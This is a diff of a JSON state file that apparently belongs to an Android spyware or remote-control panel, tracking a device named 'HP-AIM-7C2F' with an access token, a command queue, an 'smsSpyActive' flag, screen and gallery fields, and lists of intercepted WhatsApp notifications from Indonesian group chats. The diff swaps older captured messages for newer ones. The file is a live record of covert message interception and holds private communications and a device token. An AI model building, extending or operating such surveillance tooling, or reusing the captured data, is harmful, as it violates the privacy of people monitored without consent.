@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044389624,
+    "lastSeen": 1775044392466,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15392 pesan dari 10 chat",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044392698
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13126 pesan): ~ r",
+        "content": "kadang kita perlu belajar dari kesalahan",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044392625
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:44",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043874536
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15237 pesan dari 10 chat",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043872679
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12963 pesan): ~ Bot",
-        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : oi prendd mbr epep yuuuu 😜👈🏻\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043870483
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13126 pesan): ~ r",
+        "content": "kadang kita perlu belajar dari kesalahan",
+        "time": "01/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044392734
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:44",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043870658
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12963 pesan): ~ Bot",
-        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : oi prendd mbr epep yuuuu 😜👈🏻\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043870507
       }
     ],
     "galleryPhotos": [],
